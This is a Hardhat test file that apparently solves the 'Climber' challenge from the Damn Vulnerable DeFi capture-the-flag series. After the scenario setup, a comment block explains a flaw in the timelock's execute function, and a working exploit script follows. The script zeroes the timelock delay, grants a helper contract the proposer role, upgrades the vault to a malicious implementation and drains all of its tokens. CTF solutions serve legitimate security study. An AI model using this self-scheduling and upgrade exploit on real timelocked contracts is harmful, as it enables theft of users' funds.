const { ethers, upgrades } = require("hardhat");
const { expect } = require("chai");
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");

describe("[Challenge] Climber", function () {
  let deployer, proposer, sweeper, player;
  let timelock, vault, token;

  const VAULT_TOKEN_BALANCE = 10000000n * 10n ** 18n;
  const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
  const TIMELOCK_DELAY = 60 * 60;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, proposer, sweeper, player] = await ethers.getSigners();

    await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
    expect(await ethers.provider.getBalance(player.address)).to.equal(
      PLAYER_INITIAL_ETH_BALANCE
    );

    // Deploy the vault behind a proxy using the UUPS pattern,
    // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
    vault = await upgrades.deployProxy(
      await ethers.getContractFactory("ClimberVault", deployer),
      [deployer.address, proposer.address, sweeper.address],
      { kind: "uups" }
    );

    expect(await vault.getSweeper()).to.eq(sweeper.address);
    expect(await vault.getLastWithdrawalTimestamp()).to.be.gt(0);
    expect(await vault.owner()).to.not.eq(ethers.constants.AddressZero);
    expect(await vault.owner()).to.not.eq(deployer.address);

    // Instantiate timelock
    let timelockAddress = await vault.owner();
    timelock = await (
      await ethers.getContractFactory("ClimberTimelock", deployer)
    ).attach(timelockAddress);

    // Ensure timelock delay is correct and cannot be changed
    expect(await timelock.delay()).to.eq(TIMELOCK_DELAY);
    await expect(
      timelock.updateDelay(TIMELOCK_DELAY + 1)
    ).to.be.revertedWithCustomError(timelock, "CallerNotTimelock");

    // Ensure timelock roles are correctly initialized
    expect(
      await timelock.hasRole(ethers.utils.id("PROPOSER_ROLE"), proposer.address)
    ).to.be.true;
    expect(
      await timelock.hasRole(ethers.utils.id("ADMIN_ROLE"), deployer.address)
    ).to.be.true;
    expect(
      await timelock.hasRole(ethers.utils.id("ADMIN_ROLE"), timelock.address)
    ).to.be.true;

    // Deploy token and transfer initial token balance to the vault
    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();
    await token.transfer(vault.address, VAULT_TOKEN_BALANCE);
  });

  /**
   * The challenge is to identify an attack vector in the ClimberTimelock contract's execute function.
   * Anyone can call the execute function, and it checks if the operation can be executed AFTER it has run the operation.
   * This allows for a form of reentrancy attack, where we can schedule a timelock operation to be executed to ultimately bypass the check.
   * The attack vector is to schedule a timelock operation to change the vault's implementation to a malicious contract which adds a sweeper setter function.
   * We simply then add ourselves as the sweeper and drain all tokens from the vault contract.
   * For starters, my exploit starts by scheduling a timelock operation to change the delay to 0 so that we can execute operations instantly.
   * We then add the climberTimelockScheduler contract as a proposer so that we can queue up operations.
   * We then queue up an operation to change the vault's implementation to a malicious contract which adds a sweeper setter function.
   * **NOTE** we have to use a secondary contract (in this case, ClimberTimelockScheduler) to schedule the timelock operation because the timelock contract
   * will not allow us to schedule itself as it runs in to the recursion issue. We store the operations payload in the ClimberTimelockScheduler contract to make the exploit easier.
   * Once all the queued operations are executed, we can then change the sweeper and withdraw all the tokens.
   */
  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */
    const timelockPlayer = await timelock.connect(player);
    const maliciousClimberVaultFactory = await ethers.getContractFactory(
      "MaliciousClimberVault",
      player
    );
    const maliciousClimberVault = await maliciousClimberVaultFactory.deploy();
    const climberTimelockSchedulerFactory = await ethers.getContractFactory(
      "ClimberTimelockScheduler",
      player
    );
    const climberTimelockScheduler =
      await climberTimelockSchedulerFactory.deploy(
        timelock.address,
        vault.address,
        token.address
      );

    // Build operations from this empty operation to execute
    const operations = {
      targets: [],
      values: [],
      dataElements: [],
      salt: "0x0000000000000000000000000000000000000000000000000000000000000000",
    };

    const queueOperation = ({ target, value, dataElement }) =>
      operations.targets.push(target) &&
      operations.values.push(value) &&
      operations.dataElements.push(dataElement);

    // Update the delay to 0 so that we can execute operations instantly
    queueOperation({
      target: timelock.address,
      value: 0,
      dataElement: timelock.interface.encodeFunctionData(
        "updateDelay(uint64)",
        [0]
      ),
    });

    // Add the climberTimelockScheduler contract as proposer
    queueOperation({
      target: timelock.address,
      value: 0,
      dataElement: timelock.interface.encodeFunctionData(
        "grantRole(bytes32,address)",
        [ethers.utils.id("PROPOSER_ROLE"), climberTimelockScheduler.address]
      ),
    });

    // Update the UUPS implementation of the vault to the malicious contract which adds a sweeper setter function.
    queueOperation({
      target: vault.address,
      value: 0,
      dataElement: vault.interface.encodeFunctionData("upgradeTo(address)", [
        maliciousClimberVault.address,
      ]),
    });

    // Queue the timelock scheduler to change the sweeper to us, and we can then withdraw the tokens.
    queueOperation({
      target: climberTimelockScheduler.address,
      value: 0,
      dataElement:
        climberTimelockScheduler.interface.encodeFunctionData(
          "scheduleTimelock()"
        ),
      salt: operations.salt,
    });

    // Save our operations payload in our contract
    await climberTimelockScheduler.setSchedulePayload(operations);

    await timelockPlayer.execute(
      operations.targets,
      operations.values,
      operations.dataElements,
      operations.salt
    );
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
    expect(await token.balanceOf(vault.address)).to.eq(0);
    expect(await token.balanceOf(player.address)).to.eq(VAULT_TOKEN_BALANCE);
  });
});
